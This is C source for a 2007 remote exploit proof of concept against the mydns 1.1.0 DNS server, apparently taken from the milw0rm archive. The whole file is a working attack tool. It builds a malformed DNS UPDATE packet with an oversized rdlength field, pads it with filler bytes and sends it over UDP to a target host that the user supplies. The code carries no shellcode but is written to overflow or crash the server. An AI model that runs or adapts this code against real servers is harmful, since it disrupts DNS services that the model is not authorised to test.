/* mydns-rr-smash.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * mydns remote exploit PoC (x86-lnx)
 * by mu-b - Apr 2007
 *
 * - Tested on: mydns-1.1.0 (.tar.gz)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUF_SIZE    512
#define NOP         0x41

#define DEF_PORT    53
#define PORT_DNS    DEF_PORT

static void sock_send_udp (u_char * host, int port, u_char * src, int len);
static void zbuffami (u_char * zbuf, u_char *domain);

static void
sock_send_udp (u_char * host, int port, u_char * src, int len)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  sendto (sock, src, len, 0, (struct sockaddr *) &address, sizeof (address));
}

static void
zbuffami (u_char * zbuf, u_char *domain)
{
  u_char *ptr, *bgn, *end;

  ptr = zbuf;
  *ptr++ = 0x69;  /* transaction id */
  *ptr++ = 0x69;
  *ptr++ = 0x28;  /* flags */
  *ptr++ = 0x80;
  *ptr++ = 0x00;  /* number of questions */
  *ptr++ = 0x01;
  *ptr++ = 0x00;  /* number of answers */
  *ptr++ = 0x01;
  *ptr++ = 0x00;  /* number of authority rr's */
  *ptr++ = 0x01;
  *ptr++ = 0x00;  /* number of additional rr's */
  *ptr++ = 0x00;

                  /* question */
  bgn = strtok (domain, ".");
  while (bgn != NULL)
    {
      unsigned int len;

      len = strlen (bgn);
      *ptr++ = len;
      memcpy (ptr, bgn, len);
      ptr += len;

      bgn = strtok (NULL, ".");
    }
  *ptr++ = 0x00;  /* terminate name */

  *ptr++ = 0x00;  /* type */
  *ptr++ = 0x06;
  *ptr++ = 0xff;  /* class */
  *ptr++ = 0xff;

                  /* update */
  *ptr++ = 0x00;  /* . */
  *ptr++ = 0x00;  /* rr->type */
  *ptr++ = 0x00;
  *ptr++ = 0x00;  /* rr->class */
  *ptr++ = 0x01;
  *ptr++ = 0xff;  /* rr->ttl */
  *ptr++ = 0xff;
  *ptr++ = 0xff;
  *ptr++ = 0xff;
  *ptr++ = 0xff;  /* rr->rdlength */
  *ptr++ = 0xff;

  /* rrdata */
  printf ("NOP: %d\n", BUF_SIZE - (ptr - zbuf));
  memset (ptr, NOP, BUF_SIZE - (ptr - zbuf));
}

int
main (int argc, char **argv)
{
  int sock;
  u_char zbuf[BUF_SIZE];

  printf ("mydns <= 1.1.0 remote exploit PoC\n"
          "by: <mu-b@digit-labs.org>\n"
	  "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc <= 2)
    {
      fprintf (stderr, "Usage: %s <host> <update-domain>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  printf ("+Attacking to %s...\n", argv[1]);

  printf ("+Building evil query...");
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, argv[2]);
  printf ("  done\n");

  printf ("+Sending Payload...");
  sock_send_udp (argv[1], PORT_DNS, zbuf, BUF_SIZE);
  printf ("  done\n");
  sleep (1);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-04-27]
